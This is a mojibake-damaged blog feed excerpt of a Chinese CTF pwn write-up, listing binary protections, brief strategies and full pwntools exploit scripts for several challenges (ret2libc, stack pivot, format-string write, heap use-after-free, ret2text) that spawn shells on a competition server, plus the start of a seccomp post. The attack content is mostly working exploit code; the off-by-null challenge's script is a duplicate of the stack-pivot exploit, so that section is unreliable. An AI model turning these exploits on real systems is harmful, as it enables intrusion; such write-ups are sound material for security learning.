p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0x0</span>) + p32(<span class="hljs-number">0x0</span>) + p32(binsh_addr) + p32(int80_addr)<br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><h3 id="ç¨‹åºä¿æŠ¤-9"><a href="#ç¨‹åºä¿æŠ¤-9" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-9"><a href="#è§£é¢˜æ€è·¯-9" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>ret2libc</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2057</span>)<br><span class="hljs-comment">#p = process('./sleep')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br>elf = ELF(<span class="hljs-string">'./sleep'</span>)<br><br>puts_got = elf.got[<span class="hljs-string">"puts"</span>]<br>puts_plt = elf.plt[<span class="hljs-string">"puts"</span>]<br>vuln_addr = <span class="hljs-number">0x4006BD</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000400783</span><br><br><br>payload2 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>+<span class="hljs-number">8</span>)<br>payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>p.sendlineafter(<span class="hljs-string">"Please cherish every second of sleeping time !!!\n"</span>, payload2)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>,puts_addr)<br><br><span class="hljs-comment"># libcbase = puts_addr - libc.symbols['puts']</span><br><span class="hljs-comment"># system_addr = libcbase + libc.symbols['system']</span><br><span class="hljs-comment"># binsh_addr = libcbase + next(libc.search("/bin/sh"))</span><br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x06f6a0</span><br>system_addr = libc + <span class="hljs-number">0x0453a0</span><br>binsh_addr = libc + <span class="hljs-number">0x18ce57</span><br><br>payload3 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>+<span class="hljs-number">8</span>)<br>payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">"Please cherish every second of sleeping time !!!\n"</span>, payload3)<br><br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="stackpivot-x86"><a href="#stackpivot-x86" class="headerlink" title="stackpivot_x86"></a>stackpivot_x86</h2><h3 id="ç¨‹åºä¿æŠ¤-10"><a href="#ç¨‹åºä¿æŠ¤-10" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-10"><a href="#è§£é¢˜æ€è·¯-10" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>æ ˆè¿ç§»è›®æœ‰æ„æ€çš„ï¼Œç»“æ„bâ€™aâ€™*padding + p64(goal) + p64(leave_ret)ï¼Œé€šè¿‡æ‰§è¡Œä¸¤æ¬¡ leave ; ret å°†æ ˆè¿ç§»åˆ°ç›®æ ‡ä½ç½®</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('123.60.135.228',2131)</span><br>p = process(<span class="hljs-string">'./stack_pivotingx86'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>binsh = <span class="hljs-number">0x0804A030</span><br>system_addr = <span class="hljs-number">0x08048579</span><br>leave_ret = <span class="hljs-number">0x080484d8</span><br>offset = <span class="hljs-number">0xffffd028</span> - <span class="hljs-number">0xffffcff0</span> <span class="hljs-comment">#ebpè·ç¦»è¾“å…¥åœ°å€çš„å€¼</span><br><br>pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x27</span> + <span class="hljs-string">b'b'</span><br>p.send(pay)<br>p.recvuntil(<span class="hljs-string">'b'</span>)<br>ebp_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"ebp_addr -&gt; "</span>,<span class="hljs-built_in">hex</span>(ebp_addr)) <span class="hljs-comment">#æ³„éœ²ebp</span><br><br>s_addr = ebp_addr - <span class="hljs-number">0x38</span> <span class="hljs-comment">#è®¡ç®—ebp å’Œ è¾“å…¥ çš„è·ç¦»</span><br><br>pay1 = p32(<span class="hljs-number">0</span>)<br>pay1 += p32(system_addr)<br>pay1 += p32(binsh)<br>pay1 += p32(<span class="hljs-number">0</span>)<br>pay1 = pay1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b'\x00'</span>)<br>pay1 += p32(s_addr)<br>pay1 += p32(leave_ret)<br>gdb.attach(p)<br>p.send(pay1)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="å¤•é˜³ä¸‹çš„èˆè€…"><a href="#å¤•é˜³ä¸‹çš„èˆè€…" class="headerlink" title="å¤•é˜³ä¸‹çš„èˆè€…"></a>å¤•é˜³ä¸‹çš„èˆè€…</h2><h3 id="ç¨‹åºä¿æŠ¤-11"><a href="#ç¨‹åºä¿æŠ¤-11" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-11"><a href="#è§£é¢˜æ€è·¯-11" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>é¢˜ç›®ä¸»è¦ç±»å‹ä¸ºoffbynullåˆ¶é€ å †å—é‡å ï¼Œå‡½æ•°ç»“æ„æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦idaé€†å‘ç†æ¸…ï¼Œè¿™é‡Œæä¾›ç®€å•æ€è·¯</p><ul><li>Step1ï¼šæ³„éœ²libcåŸºå€ã€‚ç”³è¯·chunkï¼Œæ­£å¸¸é‡Šæ”¾ï¼Œå¤§äºfastbinçš„chunkä¼šè¢«æ”¾å…¥unsortedbinä¸­ï¼Œä¸”fdå’Œbkå‡æŒ‡å‘äºmain_arena_88çš„ä½ç½®ï¼Œå¯ä»¥è·å¾—libcåŸºå€</li><li>Step2ï¼šæ³„éœ²å †åœ°å€ã€‚ä¸ºå•¥æ³„éœ²å †åœ°å€ï¼Œå› ä¸ºå¼€å¯äº†PIEï¼Œåˆ›å»º2ä¸ªä¸ç›¸é‚»çš„ small chunkï¼Œé‡Šæ”¾åä¼šæ”¾åˆ° unsoted bin ä¸­ï¼Œé€šè¿‡æ‰“å°å‡½æ•°å¯ä»¥æ³„éœ²åœ°å€ã€‚</li><li>Step3ï¼šoff-by-nullï¼Œgetshell åˆ©ç”¨off-by-nullæ¼æ´åˆ¶é€ å †å—é‡å ï¼Œç”¨fastbinå»ç”³è¯·mallochook-0x23ä½ç½®çš„ä¸€ä¸ªchunkå»ä¿®æ”¹mallochookä¸ºog</li></ul><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('123.60.135.228',2131)</span><br>p = process(<span class="hljs-string">'./stack_pivotingx86'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>binsh = <span class="hljs-number">0x0804A030</span><br>system_addr = <span class="hljs-number">0x08048579</span><br>leave_ret = <span class="hljs-number">0x080484d8</span><br>offset = <span class="hljs-number">0xffffd028</span> - <span class="hljs-number">0xffffcff0</span> <span class="hljs-comment">#ebpè·ç¦»è¾“å…¥åœ°å€çš„å€¼</span><br><br>pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x27</span> + <span class="hljs-string">b'b'</span><br>p.send(pay)<br>p.recvuntil(<span class="hljs-string">'b'</span>)<br>ebp_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"ebp_addr -&gt; "</span>,<span class="hljs-built_in">hex</span>(ebp_addr)) <span class="hljs-comment">#æ³„éœ²ebp</span><br><br>s_addr = ebp_addr - <span class="hljs-number">0x38</span> <span class="hljs-comment">#è®¡ç®—ebp å’Œ è¾“å…¥ çš„è·ç¦»</span><br><br>pay1 = p32(<span class="hljs-number">0</span>)<br>pay1 += p32(system_addr)<br>pay1 += p32(binsh)<br>pay1 += p32(<span class="hljs-number">0</span>)<br>pay1 = pay1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b'\x00'</span>)<br>pay1 += p32(s_addr)<br>pay1 += p32(leave_ret)<br>gdb.attach(p)<br>p.send(pay1)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="test-format"><a href="#test-format" class="headerlink" title="test_format"></a>test_format</h2><h3 id="ç¨‹åºä¿æŠ¤-12"><a href="#ç¨‹åºä¿æŠ¤-12" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-12"><a href="#è§£é¢˜æ€è·¯-12" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¿®æ”¹ä»»æ„ä½ç½®çš„å€¼</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2121</span>)<br><span class="hljs-comment">#p = process('./test_format')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./test_format'</span>)<br><br>goal = <span class="hljs-number">0x0804A030</span><br>payload = <span class="hljs-string">'aaaa%8$n'</span> + p64(goal)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="heap-Easy-Uaf"><a href="#heap-Easy-Uaf" class="headerlink" title="heap_Easy_Uaf"></a>heap_Easy_Uaf</h2><h3 id="ç¨‹åºä¿æŠ¤-13"><a href="#ç¨‹åºä¿æŠ¤-13" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-13"><a href="#è§£é¢˜æ€è·¯-13" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>æ¼æ´å­˜åœ¨äºAre()å‡½æ•°ä¸­ï¼Œå‡½æ•°mallocäº†ä¸€ä¸ª0x71å¤§å°çš„å †å—ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ¸…0ï¼Œå­˜åœ¨é‡Šæ”¾åä½¿ç”¨çš„å¯èƒ½æ€§ã€‚åœ¨ä¹‹åç”³è¯·äº†ä¸€ä¸ªchunk bï¼Œchunk bçš„å†…å®¹å­˜åœ¨å †æº¢å‡ºã€‚æˆ‘è¿™é‡Œçš„æ€è·¯å°±æ˜¯å¦‚æœåœ¨açš„ä¸Šæ–¹æœ‰ä¸ªå¤§å°å°äº0x71ï¼Œé‡Šæ”¾çš„chunkï¼Œç¨‹åºä¼šå°†bç”³è¯·åˆ°açš„ä¸Šæ–¹ï¼Œè¿™æ ·é€šè¿‡å †æº¢å‡ºå¯ä»¥ä¿®æ”¹açš„å†…å®¹ä¸ºâ€Flagâ€ï¼Œå®˜æ–¹åšæ³•æ˜¯ç›´æ¥ å°†ç”³è¯·çš„båœ¨aä¸­ï¼Œå¡«å†™bçš„å†…å®¹ä¸ºFlagä¹Ÿå¯ä»¥ï¼</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2094</span>)<br><span class="hljs-comment">#p = process('./heap_Easy_Uaf')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./heap_Easy_Uaf'</span>)<br><span class="hljs-comment">#heaparray = 0x602100</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Content of Emo!:'</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">amaze</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"5"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Chunk size :\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Please Input Content : \n'</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"6"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><br>heap_ptr = <span class="hljs-number">0x602100</span><br>shell=<span class="hljs-number">0x400A16</span><br><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#1</span><br><span class="hljs-comment">#debug()</span><br>amaze(<span class="hljs-number">8</span>,<span class="hljs-string">''</span>)<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>pay = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">"Flag"</span><br>amaze(<span class="hljs-number">8</span>,pay)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="å°ç‹—æ±ªæ±ªæ±ª"><a href="#å°ç‹—æ±ªæ±ªæ±ª" class="headerlink" title="å°ç‹—æ±ªæ±ªæ±ª"></a>å°ç‹—æ±ªæ±ªæ±ª</h2><h3 id="ç¨‹åºä¿æŠ¤-14"><a href="#ç¨‹åºä¿æŠ¤-14" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-14"><a href="#è§£é¢˜æ€è·¯-14" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>ret2text</p><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2133</span>)<br><span class="hljs-comment">#p = process('./woof')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br><br>backdoor = <span class="hljs-number">0x0804859B</span><br>p.recvuntil(<span class="hljs-string">b'This puppy needs to eat a few bones?\n'</span>)<br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x9</span>+<span class="hljs-number">4</span>) + p32(<span class="hljs-number">0x0804859B</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹ ä¸€æ¬¡æ¯”èµ›çš„å¤ç›˜ï¼Œé™¤äº†å¤•é˜³ä¸‹çš„èˆè€…æœ‰ç‚¹éš¾åº¦ä¹‹å¤–ï¼Œå…¶ä»–é¢˜ç›®éš¾åº¦è¿˜é€‚ä¸­ï¼Œæœ€åä¹Ÿæ˜¯æ‹¿åˆ°äº†ä¸é”™çš„æ’åï¼æœŸå¾…</summary>
      
    
    
    
    <category term="wp" scheme="https://kylinxin.github.io/categories/wp/"/>
    
    
    <category term="wp" scheme="https://kylinxin.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>prctl-seccomp-orw</title>
    <link href="https://kylinxin.github.io/2023/09/18/prctl-seccomp/"/>
    <id>https://kylinxin.github.io/2023/09/18/prctl-seccomp/</id>
    <published>2023-09-18T15:14:29.000Z</published>
    <updated>2023-11-26T06:23:19.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åˆæ¢ï¼ˆLinux-Kernelï¼‰sandboxä¸­çš„prctl-seccompæœºåˆ¶ï¼ˆorwï¼‰"><a href="#åˆæ¢ï¼ˆLinux-Kernelï¼‰sandboxä¸­çš„prctl-seccompæœºåˆ¶ï¼ˆorwï¼‰" class="headerlink" title="åˆæ¢ï¼ˆLinux Kernelï¼‰sandboxä¸­çš„prctl-seccompæœºåˆ¶ï¼ˆorwï¼‰"></a><strong>åˆæ¢ï¼ˆLinux Kernelï¼‰sandboxä¸­çš„prctl-seccompæœºåˆ¶ï¼ˆorwï¼‰</strong></h1><blockquote><p>é¢˜ç›®æ¥æºï¼š<a href="https://pwnable.tw/challenge/#2%EF%BC%88orw%EF%BC%89">https://pwnable.tw/challenge/#2ï¼ˆorwï¼‰</a><br>å‚è€ƒèµ„æ–™ï¼š<br><a href="https://www.anquanke.com/post/id/186447">https://www.anquanke.com/post/id/186447</a><br><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">https://man7.org/linux/man-pages/man2/prctl.2.html</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br>é™„ä»¶ï¼š<br>é“¾æ¥: <a href="https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A">https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A</a>  å¯†ç : hvqc<br>â€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V3çš„åˆ†äº«</p></blockquote><h2 id="prctl-seccomp-ç®€ä»‹"><a href="#prctl-seccomp-ç®€ä»‹" class="headerlink" 